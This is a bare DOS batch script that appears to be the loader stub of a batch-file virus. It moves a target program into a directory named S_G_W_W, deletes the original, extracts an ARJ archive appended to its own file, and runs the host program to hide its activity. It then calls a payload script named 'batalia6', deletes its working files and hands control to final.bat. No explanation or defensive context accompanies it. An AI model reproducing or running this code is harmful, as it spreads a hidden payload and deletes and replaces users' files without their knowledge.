@echo off
md S_G_W_W
cd S_G_W_W
copy ..\%1 wait > nul
del ..\%1 > nul
arj x ..\%0.bat > nul
copy %1 ..\%1 >nul
cd ..
call %1
cd s_g_w_w
del ..\%1
del %1
call batalia6
copy wait ..\%1 >nul
del wait
del rulz
del zagl 
del batalia6.bat
copy final.bat ..\final.bat >nul
cd ..
final %0
